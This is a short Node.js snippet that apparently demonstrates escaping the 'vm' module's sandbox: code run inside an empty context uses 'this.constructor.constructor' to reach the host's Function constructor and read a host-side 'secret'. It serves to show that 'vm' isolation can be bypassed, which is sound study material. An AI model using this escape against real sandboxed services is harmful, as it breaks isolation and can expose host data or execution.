const secret = "14-828";
const vm = require('vm');

let context = {};
vm.createContext(context); // Contextify the object.

code = "this.constructor.constructor('return secret')()";
vm.runInContext(code, context);